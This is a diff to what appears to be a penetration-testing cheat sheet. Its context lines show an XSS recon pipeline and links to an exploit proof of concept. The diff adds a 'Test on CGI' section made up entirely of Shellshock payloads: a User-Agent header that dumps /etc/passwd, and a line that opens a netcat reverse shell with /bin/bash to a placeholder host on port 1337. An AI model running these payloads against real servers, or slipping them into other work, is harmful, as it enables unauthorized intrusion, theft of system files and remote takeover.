@@ -119,3 +119,8 @@ cat target.txt | waybackurls | gf xss | kxss
 > ***https://github.com/antichown/0x94TR***   
 > ***For more info - Exploit Proof of Concept***   
 > ***https://youtu.be/TrQi9iwtA0k***
+## Test on CGI (cgi-bin)
+```sh
+User-Agent: () { :;}; echo $(</etc/passwd)
+() { :;}; /usr/bin/nc ip 1337 -e /bin/bash
+```
